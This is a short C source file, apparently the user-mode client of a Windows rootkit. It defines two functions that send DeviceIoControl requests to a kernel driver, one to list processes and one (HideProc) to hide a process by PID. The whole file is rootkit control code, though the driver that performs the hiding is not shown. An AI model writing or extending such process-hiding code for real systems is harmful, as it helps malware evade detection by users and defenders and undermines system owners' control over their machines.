#include <windows.h>

#include "rtk.h"
#include "..\driver\ioctldef.h"

BOOL ListProc(HANDLE hDevice, void* buffer, int bufferSize, DWORD* bytesRead)
{
	BOOL success = DeviceIoControl(
		hDevice, 
		IOCTL_RTK_LISTPROC,
		NULL,
		0,
		buffer,
		bufferSize,
		bytesRead,
		NULL
	);
	
	return success;
}

BOOL HideProc(HANDLE hDevice, DWORD pid)
{
	DWORD bytesRead;

	BOOL success = DeviceIoControl(
		hDevice, 
		IOCTL_RTK_HIDEPROC,
		(void *) &pid,
		sizeof(DWORD),
		NULL,
		0,
		&bytesRead,
		NULL
	);
	
	return success;	
}
